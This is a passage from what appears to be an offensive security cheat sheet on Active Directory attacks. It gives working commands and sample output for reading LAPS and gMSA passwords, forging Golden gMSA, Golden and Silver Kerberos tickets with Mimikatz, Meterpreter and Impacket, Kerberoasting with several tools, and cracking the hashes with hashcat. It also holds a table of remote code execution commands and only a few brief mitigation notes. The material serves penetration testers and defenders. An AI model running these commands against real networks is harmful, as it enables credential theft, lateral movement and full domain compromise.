<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ldapsearch -x -h  -D <span style="color:#e6db74">&#34;@&#34;</span> -w  -b <span style="color:#e6db74">&#34;dc=&lt;&gt;,dc=&lt;&gt;,dc=&lt;&gt;&#34;</span> <span style="color:#e6db74">&#34;(&amp;(objectCategory=computer)(ms-MCS-AdmPwd=*))&#34;</span> ms-MCS-AdmPwd<span style="color:#e6db74">`</span>
</span></span></code></pre></div></li>
</ul>
</li>
</ul>
<h4 id="grant-laps-access">
  Grant LAPS Access
  <a class="anchor" href="#grant-laps-access">#</a>
</h4>
<p>The members of the group <strong>&ldquo;Account Operator&rdquo;</strong> can add and modify all the non admin users and groups. Since <strong>LAPS ADM</strong> and <strong>LAPS READ</strong> are considered as non admin groups, it&rsquo;s possible to add an user to them, and read the LAPS admin password</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>Add-DomainGroupMember -Identity <span style="color:#e6db74">&#39;LAPS ADM&#39;</span> -Members <span style="color:#e6db74">&#39;user1&#39;</span> -Credential $cred -Domain <span style="color:#e6db74">&#34;domain.local&#34;</span>
</span></span><span style="display:flex;"><span>Add-DomainGroupMember -Identity <span style="color:#e6db74">&#39;LAPS READ&#39;</span> -Members <span style="color:#e6db74">&#39;user1&#39;</span> -Credential $cred -Domain <span style="color:#e6db74">&#34;domain.local&#34;</span>
</span></span></code></pre></div><h3 id="reading-gmsa-password">
  Reading GMSA Password
  <a class="anchor" href="#reading-gmsa-password">#</a>
</h3>
<blockquote>
<p>User accounts created to be used as service accounts rarely have their password changed. Group Managed Service Accounts (GMSAs) provide a better approach (starting in the Windows 2012 timeframe). The password is managed by AD and automatically rotated every 30 days to a randomly generated password of 256 bytes.</p>
</blockquote>
<h4 id="gmsa-attributes-in-the-active-directory">
  GMSA Attributes in the Active Directory
  <a class="anchor" href="#gmsa-attributes-in-the-active-directory">#</a>
</h4>
<ul>
<li><code>msDS-GroupMSAMembership</code> (<code>PrincipalsAllowedToRetrieveManagedPassword</code>) - stores the security principals that can access the GMSA password.</li>
<li><code>msds-ManagedPassword</code> - This attribute contains a BLOB with password information for group-managed service accounts.</li>
<li><code>msDS-ManagedPasswordId</code> - This constructed attribute contains the key identifier for the current managed password data for a group MSA.</li>
<li><code>msDS-ManagedPasswordInterval</code> - This attribute is used to retrieve the number of days before a managed password is automatically changed for a group MSA.</li>
</ul>
<h4 id="extract-nt-hash-from-the-active-directory">
  Extract NT hash from the Active Directory
  <a class="anchor" href="#extract-nt-hash-from-the-active-directory">#</a>
</h4>
<ul>
<li>
<p><a href="https://github.com/rvazarkar/GMSAPasswordReader">GMSAPasswordReader</a> (C#)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span><span style="color:#75715e"># https://github.com/rvazarkar/GMSAPasswordReader</span>
</span></span><span style="display:flex;"><span>GMSAPasswordReader.exe --accountname SVC_SERVICE_ACCOUNT
</span></span></code></pre></div></li>
<li>
<p><a href="https://github.com/micahvandeusen/gMSADumper">gMSADumper (Python)</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># https://github.com/micahvandeusen/gMSADumper</span>
</span></span><span style="display:flex;"><span>python3 gMSADumper.py -u User -p Password1 -d domain.local
</span></span></code></pre></div></li>
<li>
<p>Active Directory Powershell</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>$gmsa =  Get-ADServiceAccount -Identity <span style="color:#e6db74">&#39;SVC_SERVICE_ACCOUNT&#39;</span> -Properties <span style="color:#e6db74">&#39;msDS-ManagedPassword&#39;</span>
</span></span><span style="display:flex;"><span>$blob = $gmsa.<span style="color:#e6db74">&#39;msDS-ManagedPassword&#39;</span>
</span></span><span style="display:flex;"><span>$mp = ConvertFrom-ADManagedPasswordBlob $blob
</span></span><span style="display:flex;"><span>$hash1 =  ConvertTo-NTHash -Password $mp.SecureCurrentPassword
</span></span></code></pre></div></li>
<li>
<p><a href="https://gist.github.com/kdejoyce/f0b8f521c426d04740148d72f5ea3f6f#file-gmsa_permissions_collection-ps1">gMSA_Permissions_Collection.ps1</a> based on Active Directory PowerShell module</p>
</li>
</ul>
<h3 id="forging-golden-gmsa">
  Forging Golden GMSA
  <a class="anchor" href="#forging-golden-gmsa">#</a>
</h3>
<blockquote>
<p>One notable difference between a <strong>Golden Ticket</strong> attack and the <strong>Golden GMSA</strong> attack is that they no way of rotating the KDS root key secret. Therefore, if a KDS root key is compromised, there is no way to protect the gMSAs associated with it.</p>
</blockquote>
<ul>
<li>Using <a href="https://github.com/Semperis/GoldenGMSA">GoldenGMSA</a>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span><span style="color:#75715e"># Enumerate all gMSAs</span>
</span></span><span style="display:flex;"><span>GoldenGMSA.exe gmsainfo
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Query for a specific gMSA</span>
</span></span><span style="display:flex;"><span>GoldenGMSA.exe gmsainfo --sid S-<span style="color:#ae81ff">1</span>-<span style="color:#ae81ff">5</span>-<span style="color:#ae81ff">21</span>-<span style="color:#ae81ff">1437000690</span>-<span style="color:#ae81ff">1664695696</span>-<span style="color:#ae81ff">1586295871</span>-<span style="color:#ae81ff">1112</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Dump all KDS Root Keys</span>
</span></span><span style="display:flex;"><span>GoldenGMSA.exe kdsinfo
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Dump a specific KDS Root Key</span>
</span></span><span style="display:flex;"><span>GoldenGMSA.exe kdsinfo --guid 46e5b8b9-ca57-<span style="color:#ae81ff">01e6</span>-e8b9-fbb267e4adeb
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Compute gMSA password</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># --sid &lt;gMSA SID&gt;: SID of the gMSA (required)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># --kdskey &lt;Base64-encoded blob&gt;: Base64 encoded KDS Root Key</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># --pwdid &lt;Base64-encoded blob&gt;: Base64 of msds-ManagedPasswordID attribute value</span>
</span></span><span style="display:flex;"><span>GoldenGMSA.exe compute --sid S-<span style="color:#ae81ff">1</span>-<span style="color:#ae81ff">5</span>-<span style="color:#ae81ff">21</span>-<span style="color:#ae81ff">1437000690</span>-<span style="color:#ae81ff">1664695696</span>-<span style="color:#ae81ff">1586295871</span>-<span style="color:#ae81ff">1112</span> <span style="color:#75715e"># requires privileged access to the domain</span>
</span></span><span style="display:flex;"><span>GoldenGMSA.exe compute --sid S-<span style="color:#ae81ff">1</span>-<span style="color:#ae81ff">5</span>-<span style="color:#ae81ff">21</span>-<span style="color:#ae81ff">1437000690</span>-<span style="color:#ae81ff">1664695696</span>-<span style="color:#ae81ff">1586295871</span>-<span style="color:#ae81ff">1112</span> --kdskey AQAAALm45UZXyuYB[...]G2/M= <span style="color:#75715e"># requires LDAP access</span>
</span></span><span style="display:flex;"><span>GoldenGMSA.exe compute --sid S-<span style="color:#ae81ff">1</span>-<span style="color:#ae81ff">5</span>-<span style="color:#ae81ff">21</span>-<span style="color:#ae81ff">1437000690</span>-<span style="color:#ae81ff">1664695696</span>-<span style="color:#ae81ff">1586295871</span>-<span style="color:#ae81ff">1112</span> --kdskey AQAAALm45U[...]SM0R7djG2/M= --pwdid AQAAA[..]AAA <span style="color:#75715e"># Offline mode</span>
</span></span></code></pre></div></li>
</ul>
<h3 id="pass-the-ticket-golden-tickets">
  Pass-the-Ticket Golden Tickets
  <a class="anchor" href="#pass-the-ticket-golden-tickets">#</a>
</h3>
<p>Forging a TGT require the <code>krbtgt</code> NTLM hash</p>
<blockquote>
<p>The way to forge a Golden Ticket is very similar to the Silver Ticket one. The main differences are that, in this case, no service SPN must be specified to ticketer.py, and the krbtgt ntlm hash must be used.</p>
</blockquote>
<h4 id="using-mimikatz">
  Using Mimikatz
  <a class="anchor" href="#using-mimikatz">#</a>
</h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Get info - Mimikatz</span>
</span></span><span style="display:flex;"><span>lsadump::lsa /inject /name<span style="color:#960050;background-color:#1e0010">:</span>krbtgt
</span></span><span style="display:flex;"><span>lsadump::lsa /patch
</span></span><span style="display:flex;"><span>lsadump::trust /patch
</span></span><span style="display:flex;"><span>lsadump::dcsync /user<span style="color:#960050;background-color:#1e0010">:</span>krbtgt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Forge a Golden ticket - Mimikatz</span>
</span></span><span style="display:flex;"><span>kerberos::purge
</span></span><span style="display:flex;"><span>kerberos::golden /user<span style="color:#960050;background-color:#1e0010">:</span>evil /domain<span style="color:#960050;background-color:#1e0010">:</span>pentestlab.local /sid<span style="color:#960050;background-color:#1e0010">:</span>S-<span style="color:#ae81ff">1</span>-<span style="color:#ae81ff">5</span>-<span style="color:#ae81ff">21</span>-<span style="color:#ae81ff">3737340914</span>-<span style="color:#ae81ff">2019594255</span>-<span style="color:#ae81ff">2413685307</span> /krbtgt<span style="color:#960050;background-color:#1e0010">:</span>d125e4f69c851529045ec95ca80fa37e /ticket<span style="color:#960050;background-color:#1e0010">:</span>evil.tck /ptt
</span></span><span style="display:flex;"><span>kerberos::tgt
</span></span></code></pre></div><h4 id="using-meterpreter">
  Using Meterpreter
  <a class="anchor" href="#using-meterpreter">#</a>
</h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Get info - Meterpreter(kiwi)</span>
</span></span><span style="display:flex;"><span>dcsync_ntlm krbtgt
</span></span><span style="display:flex;"><span>dcsync krbtgt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Forge a Golden ticket - Meterpreter</span>
</span></span><span style="display:flex;"><span>load kiwi
</span></span><span style="display:flex;"><span>golden_ticket_create -d &lt;domainname&gt; -k &lt;nthashof krbtgt&gt; -s &lt;SID without le RID&gt; -u &lt;user_for_the_ticket&gt; -t &lt;location_to_store_tck&gt;
</span></span><span style="display:flex;"><span>golden_ticket_create -d pentestlab.local -u pentestlabuser -s S-<span style="color:#ae81ff">1</span>-<span style="color:#ae81ff">5</span>-<span style="color:#ae81ff">21</span>-<span style="color:#ae81ff">3737340914</span>-<span style="color:#ae81ff">2019594255</span>-<span style="color:#ae81ff">2413685307</span> -k d125e4f69c851529045ec95ca80fa37e -t /root/Downloads/pentestlabuser.tck
</span></span><span style="display:flex;"><span>kerberos_ticket_purge
</span></span><span style="display:flex;"><span>kerberos_ticket_use /root/Downloads/pentestlabuser.tck
</span></span><span style="display:flex;"><span>kerberos_ticket_list
</span></span></code></pre></div><h4 id="using-a-ticket-on-linux">
  Using a ticket on Linux
  <a class="anchor" href="#using-a-ticket-on-linux">#</a>
</h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Convert the ticket kirbi to ccache with kekeo</span>
</span></span><span style="display:flex;"><span>misc::convert ccache ticket.kirbi
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Alternatively you can use ticketer from Impacket</span>
</span></span><span style="display:flex;"><span>./ticketer.py -nthash a577fcf16cfef780a2ceb343ec39a0d9 -domain-sid S-<span style="color:#ae81ff">1</span>-<span style="color:#ae81ff">5</span>-<span style="color:#ae81ff">21</span>-<span style="color:#ae81ff">2972629792</span>-<span style="color:#ae81ff">1506071460</span>-<span style="color:#ae81ff">1188933728</span> -domain amity.local mbrody-da
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ticketer.py -nthash HASHKRBTGT -domain-sid SID_DOMAIN_A -domain DEV Administrator -extra-sid SID_DOMAIN_B_ENTERPRISE_519
</span></span><span style="display:flex;"><span>./ticketer.py -nthash e65b41757ea496c2c60e82c05ba8b373 -domain-sid S-<span style="color:#ae81ff">1</span>-<span style="color:#ae81ff">5</span>-<span style="color:#ae81ff">21</span>-<span style="color:#ae81ff">354401377</span>-<span style="color:#ae81ff">2576014548</span>-<span style="color:#ae81ff">1758765946</span> -domain DEV Administrator -extra-sid S-<span style="color:#ae81ff">1</span>-<span style="color:#ae81ff">5</span>-<span style="color:#ae81ff">21</span>-<span style="color:#ae81ff">2992845451</span>-<span style="color:#ae81ff">2057077057</span>-<span style="color:#ae81ff">2526624608</span>-<span style="color:#ae81ff">519</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>export KRB5CCNAME=/home/user/ticket.ccache
</span></span><span style="display:flex;"><span>cat $KRB5CCNAME
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># NOTE: You may need to comment the proxy_dns setting in the proxychains configuration file</span>
</span></span><span style="display:flex;"><span>./psexec.py -k -no-pass -dc-ip <span style="color:#ae81ff">192.168</span>.1.1 AD/administrator@192.168.1.100 
</span></span></code></pre></div><p>If you need to swap ticket between Windows and Linux, you need to convert them with <code>ticket_converter</code> or <code>kekeo</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>root@kali<span style="color:#960050;background-color:#1e0010">:</span>ticket_converter$ python ticket_converter.py velociraptor.ccache velociraptor.kirbi
</span></span><span style="display:flex;"><span>Converting ccache =&gt; kirbi
</span></span><span style="display:flex;"><span>root@kali<span style="color:#960050;background-color:#1e0010">:</span>ticket_converter$ python ticket_converter.py velociraptor.kirbi velociraptor.ccache
</span></span><span style="display:flex;"><span>Converting kirbi =&gt; ccache
</span></span></code></pre></div><p>Mitigations:</p>
<ul>
<li>Hard to detect because they are legit TGT tickets</li>
<li>Mimikatz generate a golden ticket with a life-span of 10 years</li>
</ul>
<h3 id="pass-the-ticket-silver-tickets">
  Pass-the-Ticket Silver Tickets
  <a class="anchor" href="#pass-the-ticket-silver-tickets">#</a>
</h3>
<p>Forging a Service Ticket (ST) require machine account password (key) or NT hash of the service account.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Create a ticket for the service</span>
</span></span><span style="display:flex;"><span>mimikatz $ kerberos::golden /user<span style="color:#960050;background-color:#1e0010">:</span>USERNAME /domain<span style="color:#960050;background-color:#1e0010">:</span>DOMAIN.FQDN /sid<span style="color:#960050;background-color:#1e0010">:</span>DOMAIN-SID /target<span style="color:#960050;background-color:#1e0010">:</span>TARGET-HOST.DOMAIN.FQDN /rc4<span style="color:#960050;background-color:#1e0010">:</span>TARGET-MACHINE-NT-HASH /service<span style="color:#960050;background-color:#1e0010">:</span>SERVICE
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Examples</span>
</span></span><span style="display:flex;"><span>mimikatz $ /kerberos::golden /domain<span style="color:#960050;background-color:#1e0010">:</span>adsec.local /user<span style="color:#960050;background-color:#1e0010">:</span>ANY /sid<span style="color:#960050;background-color:#1e0010">:</span>S-<span style="color:#ae81ff">1</span>-<span style="color:#ae81ff">5</span>-<span style="color:#ae81ff">21</span>-<span style="color:#ae81ff">1423455951</span>-<span style="color:#ae81ff">1752654185</span>-<span style="color:#ae81ff">1824483205</span> /rc4<span style="color:#960050;background-color:#1e0010">:</span>ceaxxxxxxxxxxxxxxxxxxxxxxxxxxxxx /target<span style="color:#960050;background-color:#1e0010">:</span>DESKTOP-<span style="color:#ae81ff">01</span>.adsec.local /service<span style="color:#960050;background-color:#1e0010">:</span>cifs /ptt
</span></span><span style="display:flex;"><span>mimikatz $ kerberos::golden /domain<span style="color:#960050;background-color:#1e0010">:</span>jurassic.park /sid<span style="color:#960050;background-color:#1e0010">:</span>S-<span style="color:#ae81ff">1</span>-<span style="color:#ae81ff">5</span>-<span style="color:#ae81ff">21</span>-<span style="color:#ae81ff">1339291983</span>-<span style="color:#ae81ff">1349129144</span>-<span style="color:#ae81ff">367733775</span> /rc4<span style="color:#960050;background-color:#1e0010">:</span>b18b4b218eccad1c223306ea1916885f /user<span style="color:#960050;background-color:#1e0010">:</span>stegosaurus /service<span style="color:#960050;background-color:#1e0010">:</span>cifs /target<span style="color:#960050;background-color:#1e0010">:</span>labwws02.jurassic.park
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Then use the same steps as a Golden ticket</span>
</span></span><span style="display:flex;"><span>mimikatz $ misc::convert ccache ticket.kirbi
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>root@kali<span style="color:#960050;background-color:#1e0010">:</span>/tmp$ export KRB5CCNAME=/home/user/ticket.ccache
</span></span><span style="display:flex;"><span>root@kali<span style="color:#960050;background-color:#1e0010">:</span>/tmp$ ./psexec.py -k -no-pass -dc-ip <span style="color:#ae81ff">192.168</span>.1.1 AD/administrator@192.168.1.100 
</span></span></code></pre></div><p>Interesting services to target with a silver ticket :</p>
<table>
<thead>
<tr>
<th>Service Type</th>
<th>Service Silver Tickets</th>
<th>Attack</th>
</tr>
</thead>
<tbody>
<tr>
<td>WMI</td>
<td>HOST + RPCSS</td>
<td><code>wmic.exe /authority:&quot;kerberos:DOMAIN\DC01&quot; /node:&quot;DC01&quot; process call create &quot;cmd /c evil.exe&quot;</code></td>
</tr>
<tr>
<td>PowerShell Remoting</td>
<td>CIFS + HTTP + (wsman?)</td>
<td><code>New-PSSESSION -NAME PSC -ComputerName DC01; Enter-PSSession -Name PSC</code></td>
</tr>
<tr>
<td>WinRM</td>
<td>HTTP + wsman</td>
<td><code>New-PSSESSION -NAME PSC -ComputerName DC01; Enter-PSSession -Name PSC</code></td>
</tr>
<tr>
<td>Scheduled Tasks</td>
<td>HOST</td>
<td><code>schtasks /create /s dc01 /SC WEEKLY /RU &quot;NT Authority\System&quot; /IN &quot;SCOM Agent Health Check&quot; /IR &quot;C:/shell.ps1&quot;</code></td>
</tr>
<tr>
<td>Windows File Share (CIFS)</td>
<td>CIFS</td>
<td><code>dir \\dc01\c$</code></td>
</tr>
<tr>
<td>LDAP operations including Mimikatz DCSync</td>
<td>LDAP</td>
<td><code>lsadump::dcsync /dc:dc01 /domain:domain.local /user:krbtgt</code></td>
</tr>
<tr>
<td>Windows Remote Server Administration Tools</td>
<td>RPCSS   + LDAP  + CIFS</td>
<td>/</td>
</tr>
</tbody>
</table>
<p>Mitigations:</p>
<ul>
<li>Set the attribute &ldquo;Account is Sensitive and Cannot be Delegated&rdquo; to prevent lateral movement with the generated ticket.</li>
</ul>
<h3 id="kerberoasting">
  Kerberoasting
  <a class="anchor" href="#kerberoasting">#</a>
</h3>
<blockquote>
<p>&ldquo;A service principal name (SPN) is a unique identifier of a service instance. SPNs are used by Kerberos authentication to associate a service instance with a service logon account. &quot; - <a href="https://docs.microsoft.com/fr-fr/windows/desktop/AD/service-principal-names">MSDN</a></p>
</blockquote>
<p>Any valid domain user can request a kerberos ticket (ST) for any domain service. Once the ticket is received, password cracking can be done offline on the ticket to attempt to break the password for whatever user the service is running as.</p>
<ul>
<li>
<p><a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py">GetUserSPNs</a> from Impacket Suite</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$ GetUserSPNs.py active.htb/SVC_TGS<span style="color:#960050;background-color:#1e0010">:</span>GPPstillStandingStrong2k18 -dc-ip <span style="color:#ae81ff">10.10</span>.10.100 -request
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Impacket v0.9.17 - Copyright <span style="color:#ae81ff">2002</span>-<span style="color:#ae81ff">2018</span> Core Security Technologies
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet      LastLogon           
</span></span><span style="display:flex;"><span>--------------------  -------------  --------------------------------------------------------  -------------------  -------------------
</span></span><span style="display:flex;"><span>active/CIFS<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">445</span>       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  <span style="color:#ae81ff">2018</span>-<span style="color:#ae81ff">07</span>-<span style="color:#ae81ff">18</span> <span style="color:#ae81ff">21</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">06</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">40</span>  <span style="color:#ae81ff">2018</span>-<span style="color:#ae81ff">12</span>-<span style="color:#ae81ff">03</span> <span style="color:#ae81ff">17</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">11</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">11</span> 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~<span style="color:#ae81ff">445</span>*$424338c0a3c3af43[...]84fd2
</span></span></code></pre></div></li>
<li>
<p>CrackMapExec Module</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$ crackmapexec ldap <span style="color:#ae81ff">10.0</span>.2.11 -u <span style="color:#e6db74">&#39;username&#39;</span> -p <span style="color:#e6db74">&#39;password&#39;</span> --kdcHost <span style="color:#ae81ff">10.0</span>.2.11 --kerberoast output.txt
</span></span><span style="display:flex;"><span>LDAP        <span style="color:#ae81ff">10.0</span>.2.11       <span style="color:#ae81ff">389</span>    dc01           [*] Windows <span style="color:#ae81ff">10.0</span> Build <span style="color:#ae81ff">17763</span> x64 (name<span style="color:#960050;background-color:#1e0010">:</span>dc01) (domain<span style="color:#960050;background-color:#1e0010">:</span>lab.local) (signing<span style="color:#960050;background-color:#1e0010">:</span>True) (SMBv1<span style="color:#960050;background-color:#1e0010">:</span>False)
</span></span><span style="display:flex;"><span>LDAP        <span style="color:#ae81ff">10.0</span>.2.11       <span style="color:#ae81ff">389</span>    dc01           $krb5tgs$23$*john.doe$lab.local$MSSQLSvc/dc01.lab.local~<span style="color:#ae81ff">1433</span>*$efea32[...]49a5e82$b28fc61[...]f800f6dcd259ea1fca8f9
</span></span></code></pre></div></li>
<li>
<p><a href="https://github.com/GhostPack/Rubeus">Rubeus</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Stats</span>
</span></span><span style="display:flex;"><span>Rubeus.exe kerberoast /stats
</span></span><span style="display:flex;"><span>-------------------------------------   ----------------------------------
</span></span><span style="display:flex;"><span>| Supported Encryption Type | Count |  | Password Last Set Year | Count |
</span></span><span style="display:flex;"><span>-------------------------------------  ----------------------------------
</span></span><span style="display:flex;"><span>| RC4_HMAC_DEFAULT          | <span style="color:#ae81ff">1</span>     |  | <span style="color:#ae81ff">2021</span>                   | <span style="color:#ae81ff">1</span>     |
</span></span><span style="display:flex;"><span>-------------------------------------  ----------------------------------
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Kerberoast (RC4 ticket)</span>
</span></span><span style="display:flex;"><span>Rubeus.exe kerberoast /creduser<span style="color:#960050;background-color:#1e0010">:</span>DOMAIN\JOHN /credpassword<span style="color:#960050;background-color:#1e0010">:</span>MyP@ssW0RD /outfile<span style="color:#960050;background-color:#1e0010">:</span>hash.txt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Kerberoast (AES ticket)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Accounts with AES enabled in msDS-SupportedEncryptionTypes will have RC4 tickets requested.</span>
</span></span><span style="display:flex;"><span>Rubeus.exe kerberoast /tgtdeleg
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Kerberoast (RC4 ticket)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># The tgtdeleg trick is used, and accounts without AES enabled are enumerated and roasted.</span>
</span></span><span style="display:flex;"><span>Rubeus.exe kerberoast /rc4opsec
</span></span></code></pre></div></li>
<li>
<p><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">PowerView</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Request-SPNTicket -SPN <span style="color:#e6db74">&#34;MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local&#34;</span>
</span></span></code></pre></div></li>
<li>
<p><a href="https://github.com/its-a-feature/bifrost">bifrost</a> on <strong>macOS</strong> machine</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>./bifrost -action asktgs -ticket doIF&lt;...snip...&gt;QUw= -service host/dc1-lab.lab.local -kerberoast true
</span></span></code></pre></div></li>
<li>
<p><a href="https://github.com/ShutdownRepo/targetedKerberoast">targetedKerberoast</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># for each user without SPNs, it tries to set one (abuse of a write permission on the servicePrincipalName attribute), </span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># print the &#34;kerberoast&#34; hash, and delete the temporary SPN set for that operation</span>
</span></span><span style="display:flex;"><span>targetedKerberoast.py [-h] [-v] [-q] [-D TARGET_DOMAIN] [-U USERS_FILE] [--request-user username] [-o OUTPUT_FILE] [--use-ldaps] [--only-abuse] [--no-abuse] [--dc-ip ip address] [-d DOMAIN] [-u USER] [-k] [--no-pass | -p PASSWORD | -H [LMHASH<span style="color:#960050;background-color:#1e0010">:</span>]NTHASH | --aes-key hex key]
</span></span></code></pre></div></li>
</ul>
<p>Then crack the ticket using the correct hashcat mode (<code>$krb5tgs$23</code>= <code>etype 23</code>)</p>
<table>
<thead>
<tr>
<th>Mode</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>13100</code></td>
<td>Kerberos 5 TGS-REP etype 23 (RC4)</td>
</tr>
<tr>
<td><code>19600</code></td>
<td>Kerberos 5 TGS-REP etype 17 (AES128-CTS-HMAC-SHA1-96)</td>
</tr>
<tr>
<td><code>19700</code></td>
<td>Kerberos 5 TGS-REP etype 18 (AES256-CTS-HMAC-SHA1-96)</td>
</tr>
</tbody>
</table>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>./hashcat -m <span style="color:#ae81ff">13100</span> -a <span style="color:#ae81ff">0</span> kerberos_hashes.txt crackstation.txt
</span></span><span style="display:flex;"><span>./john --wordlist=/opt/wordlists/rockyou.txt --fork=<span style="color:#ae81ff">4</span> --format=krb5tgs ~/kerberos_hashes.txt
</span></span></code></pre></div><p>Mitigations:</p>
<ul>
<li>Have a very long password for your accounts with SPNs (&gt; 32 characters)</li>
<li>Make sure no users have SPNs</li>
</ul>
<h3 id="krb_as_rep-roasting">
  KRB_AS_REP Roasting
  <a class="anchor" href="#krb_as_rep-roasting">#</a>
</h3>
<blockquote>
<p>If a domain user does not have Kerberos preauthentication enabled, an AS-REP can be successfully requested for the user, and a component of the structure can be cracked offline a la kerberoasting</p>
</blockquote>
<p><strong>Requirements</strong>:</p>
<ul>
<li>Accounts with the attribute <strong>DONT_REQ_PREAUTH</strong> (<code>PowerView &gt; Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose</code>)</li>
</ul>
<ul>
<li>
<p><a href="https://github.com/GhostPack/Rubeus">Rubeus</a></p>
